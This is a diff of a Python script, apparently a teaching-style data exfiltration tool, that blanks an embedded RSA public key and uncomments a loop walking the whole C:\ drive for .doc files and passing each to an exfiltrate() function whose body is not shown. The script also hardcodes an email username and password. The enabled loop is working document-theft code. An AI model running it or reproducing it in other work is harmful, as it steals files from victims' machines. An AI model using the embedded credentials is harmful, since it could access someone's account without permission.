@@ -11,15 +11,7 @@ from Crypto.Cipher import PKCS1_OAEP
 doc_type = ".doc"
 username = "jms@bughunter.ca"
 password="justinBHP2014"
-public_key = '''-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoZESfhGcbVFafXYheQu4
-23zXijSAchO7LHdIAGSSvOGG3A5py6t4cCzzssgs/NtlJwAOZb6JFNAoo4SxvWkx
-zmaqTpnDGqV9pzS7aZiyj7g/E7oYwIX8x5aVmFT3V7b7QXhNYpv0kYveIT5K7rxY
-mybzmesARiyr3EdT3rUtmOV0TjD9PIM7v1xLzkI9g12BCqTGhMNsURQ+FZphadh/
-Cxnvaxbw8NFgXKCbidBvB0sng7iBmy2Fd6mUJkQM5wL7FF/joeVgLX+kirfe9qk0
-kewSuS3bwMHeKgT6I6uaZf+YVJsdzD3Pyxe3WX0kYZ3VA8hp1dXfCAR1Cu4iuwTi
-6QIDAQAB
------END PUBLIC KEY-----'''
+public_key = ''''''
 
 
 def wait_for_browser(browser):
@@ -129,11 +121,11 @@ def exfiltrate(document_path):
 
 
 if __name__ == '__main__':
-    # for parent,directories,filenames in os.walk("C:\\"):
-    #     for filename in fnmatch.filter(filenames,"*%s"%doc_type):
-    #         document_path=os.path.join(parent,filename)
-    #         print("Found:%s"%document_path)
-    #         exfiltrate(document_path)
-    #         input("continue?")
+    for parent,directories,filenames in os.walk("C:\\"):
+        for filename in fnmatch.filter(filenames,"*%s"%doc_type):
+            document_path=os.path.join(parent,filename)
+            print("Found:%s"%document_path)
+            exfiltrate(document_path)
+            input("continue?")
 
-    encrypt_string(b"helloworld")
+    # encrypt_string(b"helloworld")
